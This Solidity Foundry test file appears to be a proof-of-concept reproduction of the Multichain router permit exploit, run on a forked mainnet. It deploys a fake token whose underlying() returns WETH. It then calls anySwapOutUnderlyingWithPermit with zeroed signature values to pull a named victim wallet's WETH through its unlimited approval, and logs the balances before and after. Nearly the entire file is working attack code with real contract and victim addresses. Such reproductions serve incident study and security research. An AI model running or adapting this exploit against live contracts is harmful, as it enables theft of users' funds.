pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";

interface IMultichainRouterV4{
    function anySwapOutUnderlyingWithPermit( address from, address token, address to, uint amount, uint deadline, uint8 v, bytes32 r, bytes32 s, uint toChainID ) external;
    }

contract fakeToken {
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    function underlying() external returns(address token){
        return WETH;
    }
    
    function depositVault(uint, address) external returns(uint){
        return 0;
    }

    function burn(address, uint) external returns(bool){
        return true;
    }
}

contract test is DSTest {
    fakeToken internal faketoken;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public MultichainRouterV4 = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address public victims = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 14037236);
    }

    function testExploit() public {
        console.log("Multichain Front-end default approve tokens uint256 max number:", IERC20(WETH).allowance(victims, MultichainRouterV4), "\n");
        
        console.log("Before the attack >>>>>> \n");
        uint amount = IERC20(WETH).balanceOf(victims);
        emit log_named_decimal_uint("victims Wallet WETH balance:", IERC20(WETH).balanceOf(victims), 18);
        
        console.log("\nDeploy malicious token contracts >>>>>> \n");
        faketoken = new fakeToken();
        
        console.log("call the Vulnerability function:anySwapOutUnderlyingWithPermit >>>>>> \n");
        IMultichainRouterV4(MultichainRouterV4).anySwapOutUnderlyingWithPermit(
            victims, 
            address(faketoken), 
            address(this), 
            amount,
            block.timestamp, 
            0, 
            bytes32(uint256(0)), 
            bytes32(uint256(0)),
            56
        );
       
        verify();
    }
    function verify() public {
         console.log("After the attack, the wallet amount changes >>>>>> \n");
         emit log_named_decimal_uint("victims Wallet WETH balance:", IERC20(WETH).balanceOf(victims), 18);
         emit log_named_decimal_uint("attack Contract  WETH balance:", IERC20(WETH).balanceOf(address(faketoken)), 18);
    }
}